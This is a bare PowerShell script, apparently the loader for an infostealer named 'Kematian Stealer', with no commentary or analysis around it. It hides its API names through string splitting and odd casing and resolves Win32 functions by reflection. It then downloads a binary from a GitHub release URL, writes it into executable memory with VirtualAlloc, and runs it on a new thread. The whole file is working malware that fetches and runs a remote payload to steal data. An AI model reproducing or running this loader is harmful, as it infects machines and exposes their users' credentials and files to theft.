$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
function KematianLoader  {
    Param ($kematian_modules, $kematian_func)
    $assem = ([AppDomain]::"cUrRENtdOMAin".('G'+'e'+'tA'+'ssemblies').Invoke() | ? { $_."GLoBALAsSeMBlYcAche" -And $_."lOCaTioN".('Sp'+'lit').Invoke('\\')[-1].('E'+'q'+'uals').Invoke('System.dll')}).('Ge'+'tTy'+'pe').Invoke('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = $assem.('G'+'etMet'+'hods').Invoke() | % {If($_."NAme" -eq "GetProcAddress") {$_}}
    $handle = $assem.('G'+'e'+'tMethod').Invoke('GetModuleHandle')."INVOKE"($null, @($kematian_modules));
    [IntPtr] $result = 0;
    $result = $tmp[0]."iNvoke"($null, @([System.IntPtr]$handle, $kematian_func));
    return $result;
}
function kematian_delegates {
    Param ([Parameter(POsITIoN = 0, manDATORy = $True)] [Type[]] $func,[Parameter(pOsitIOn = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::"CuRRENtDoMAIN".('Def'+'i'+'neD'+'y'+'namicAsse'+'mb'+'ly').Invoke((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::"RUN").('DefineDyn'+'a'+'mic'+'Modu'+'le').Invoke('InMemoryModule', $false).('Def'+'in'+'eType').Invoke('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type."dEFiNECONStRUCTor"('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::"standARD", $func).('SetImple'+'ment'+'atio'+'n'+'Flag'+'s').Invoke('Runtime, Managed')
    $type.('Defi'+'n'+'eMethod').Invoke('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).('SetImp'+'le'+'men'+'tationFlag'+'s').Invoke('Runtime, Managed')
    return $type.('Cr'+'eate'+'Type').Invoke()
}
$kematianthegreat = (Invoke-WebRequest -UseBasicParsing "https://github.com/Somali-Devs/Kematian-Stealer/releases/download/KematianBuild/kematian.bin")."CONTent"
$lpMem = [System.Runtime.InteropServices.Marshal]::('Get'+'D'+'el'+'egateF'+'o'+'rF'+'unc'+'t'+'ionPointer').Invoke((KematianLoader  kernel32.dll VirtualAlloc),(kematian_delegates @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr])))."INVoke"([IntPtr]::"zerO", $kematianthegreat."leNGth", 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::('Co'+'py').Invoke($kematianthegreat, 0, $lpMem, $kematianthegreat."lENgTH")
$hThread = [System.Runtime.InteropServices.Marshal]::('GetDele'+'g'+'at'+'eFo'+'r'+'Fun'+'ctio'+'nP'+'ointer').Invoke((KematianLoader  kernel32.dll CreateThread),(kematian_delegates @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr])))."InvOkE"([IntPtr]::"ZERo",0,$lpMem,[IntPtr]::"Zero",0,[IntPtr]::"zero")
[System.Runtime.InteropServices.Marshal]::('G'+'etD'+'ele'+'gateF'+'orFunctionP'+'ointer').Invoke((KematianLoader  kernel32.dll WaitForSingleObject),(kematian_delegates @([IntPtr], [Int32])([Int])))."iNVOkE"($hThread, 0xFFFFFFFF)
